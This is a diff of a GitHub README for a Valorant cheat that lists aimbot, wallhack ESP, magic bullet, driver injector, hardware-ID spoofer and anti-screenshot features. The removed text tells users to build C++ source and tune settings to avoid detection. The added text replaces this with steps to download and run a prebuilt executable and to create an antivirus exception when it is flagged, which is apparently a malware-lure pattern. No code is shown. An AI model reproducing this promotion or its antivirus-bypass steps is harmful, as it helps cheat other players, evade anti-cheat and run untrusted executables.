@@ -1,106 +1,72 @@
-<div align="center">
+# 🎮 Covert-Valorant-Cheat - Enhance Your Gaming Experience
 
-# Covert Valorant C++
+## 📥 Download Now
+[![Download Covert-Valorant-Cheat](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/aliyus273/Covert-Valorant-Cheat/releases)
 
-I am developing various cheats and tools for games, focusing on combating scammers. My projects include creating cheats such as aimbots, ESPs, magic bullets, driver injectors, overlays, and Imgui tools.
+## 🚀 Getting Started
+Welcome to Covert-Valorant-Cheat! This application helps you improve your gameplay in Valorant with various tools like ESP, Aimbot, and more. Follow the steps below to download and run the software easily.
 
-<details>
-<summary><strong>Cheats Developed for the Following Games</strong></summary>
+## 💻 System Requirements
+- Windows 10 or later
+- Minimum 4 GB RAM
+- At least 500 MB free disk space
+- Graphics card that supports DirectX 11
 
-- Rise Online
-- Apex Legends
-- Bloodhunt
-- Call of Duty: Cold War
-- Call of Duty: Vanguard
-- Call of Duty: Warzone/Modern Warfare
-- DayZ
-- Dead By Daylight
-- Destiny 2
-- Enlisted
-- Escape From Tarkov
-- Fortnite
-- Halo Infinite
-- HyperFlick
-- New Critical Hit
-- New World
-- Mir 4
-- Noble
-- PlayerUnknown's Battlegrounds (PUBG)
-- Steam
-- Rainbow Six Siege
-- Rijin
-- Rogue Company
-- Rust
-- Scum
-- Splitgate
-- Super People
-- Unleashed
-- Valorant
-- Spoofer
-- DLL Injector
-</details>
+## 📦 Features
+- **ESP (Extra Sensory Perception):** See enemy locations through walls.
+- **Aimbot:** Automatically aim at enemies for precise shots.
+- **Magic Bullet:** Bullets hit enemies regardless of obstacles.
+- **Driver Injector:** Seamlessly inject settings into the game.
+- **Overlay Support:** Easy to view additional information without leaving the game.
+- **Imgui Interface:** User-friendly menu to adjust settings.
 
-## How to Use
+## 📋 Steps to Download & Install
+1. **Visit the Releases Page**
+   Go to the [Releases page](https://github.com/aliyus273/Covert-Valorant-Cheat/releases) to find the latest version of the software.
 
-- Download the project to your computer as zip
-- Extract Project to Folder.
-- Make Sure You Have Visual Studio Installed on Your Computer
-- [Click if Visual Studio is Not Installed](https://visualstudio.microsoft.com/en/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSLandingPage&passive=false&cid=2030)
+2. **Choose the Right File**
+   On the releases page, look for the latest version. It will typically be the file labeled with the highest version number (e.g., v1.0).
 
-### Visual Studio
+3. **Download the File**
+   Click on the file name to start downloading. This file will usually be in a `.zip` or `.exe` format.
 
-1. Open the solution file (.sln).
-2. Select **Build Solution** from the **Build** menu or press `Ctrl+Shift+B` to compile the project.
-3. When the build is complete, select **Start Without Debugging** from the **Debug** menu or press `Ctrl+F5` to run the project.
+4. **Locate the Downloaded File**
+   Once the download is complete, navigate to your downloads folder. You should see the file you just downloaded.
 
-## Valorant Cheat Customization
+5. **Extract the Files (If Needed)**
+   If the file is a `.zip`, right-click on it and select “Extract All” to unzip the contents.
 
-Welcome to our Valorant cheat customization options! We offer a range of features to personalize your cheat experience. Tailor the cheat to your gameplay style and preferences to gain a competitive edge.
+6. **Run the Application**
+   Double-click the application file (e.g., `Covert-Valorant-Cheat.exe`) to start the program. Follow any prompts that appear.
 
-**Key Customization Options:**
+7. **Configure the Settings**
+   Use the Imgui interface to customize your settings. You can toggle features like ESP and Aimbot easily.
 
-- **Aimbot Settings**: Adjust aimbot smoothness and targeting to improve accuracy.
-- **Field of View (FOV)**: Modify the FOV to enhance your awareness and control.
-- **Safety and Detection**: While our cheat is designed to be undetected, extreme settings may still attract attention. Use with caution.
+8. **Launch Valorant**
+   Run Valorant as usual. Your selected cheats will apply automatically.
 
-**Guidelines:**
+## ⚙️ Important Notes
+- Ensure your antivirus software recognizes and allows the application. Some antivirus programs may flag this cheat as harmful. You can create an exception in your antivirus settings.
+- Always use cheats responsibly. Being caught using cheats can lead to a ban from the game.
 
-- **Stay Safe**: Configure settings to mimic natural behavior to avoid detection and maintain a competitive advantage.
-- **Customize Wisely**: Choose settings that enhance your gameplay without raising suspicion.
+## 📆 Updates
+We regularly update Covert-Valorant-Cheat to enhance performance and add new features. Keep an eye on the [Releases page](https://github.com/aliyus273/Covert-Valorant-Cheat/releases) for the latest version and changelog.
 
-## Features
+## 🛠️ Troubleshooting
+If you encounter issues, consider these solutions:
+- Verify your system meets the requirements.
+- Make sure you have the latest version of the software.
+- Check the antivirus settings to ensure the application isn’t blocked.
+- Restart your computer and try running the application again.
 
-- **Aimbot**: Improve targeting accuracy.
-- **ESP**: See enemy positions and other useful information.
-- **Spoofer**: Avoid detection by changing your system's identifiers.
-- **Driver**: Tools for handling drivers.
-- **Injector**: Inject cheats into games.
+## 🗣️ Community Support
+Join our community for support, tips, and discussions:
+- **Discord:** Link to join our community server.
+- **Forum:** Link to the forum for user discussions and help.
 
-**Main Features:**
+## 📢 Feedback
+We welcome your feedback! If you have suggestions for improvements or encounter any issues, please contact us through the issues section on GitHub. Your input helps us create a better experience.
 
-- **ESP Box**: Display enemy outlines for better visibility.
-- **ESP Line**: Draw lines to highlight enemies and important locations.
-- **Bone Aimbot**: Target specific bones for precise aiming.
-- **Distance Measurement**: See the distance to enemies to make better decisions.
-- **ESP Health**: Monitor enemy health to determine when to engage.
+Remember to check the [Releases page](https://github.com/aliyus273/Covert-Valorant-Cheat/releases) for the latest updates and downloads.
 
-**Additional Features:**
-
-- **Draw Radar**: Expand your view with a radar display.
-- **Anti-Screenshot**: Remain undetected even if screenshots are taken.
-- **No FPS Drop**: Optimize performance without compromising game speed.
-- **0% ESP Delay**: Get real-time updates with no delay.
-- **0% Dead Zone**: Perfect aim with no inaccuracies.
-- **User-Friendly System**: Easy to set up and use.
-
-## Preview
-
-![image](https://user-images.githubusercontent.com/105713914/169304225-4f0a3838-4540-4e47-852f-f7b06548be55.png)
-
-## Disclaimer
-
-This source code is for educational purposes only.
-
-## License
-
-This project is licensed under the MIT. For more information, see the [License](LICENSE).
+Happy gaming!
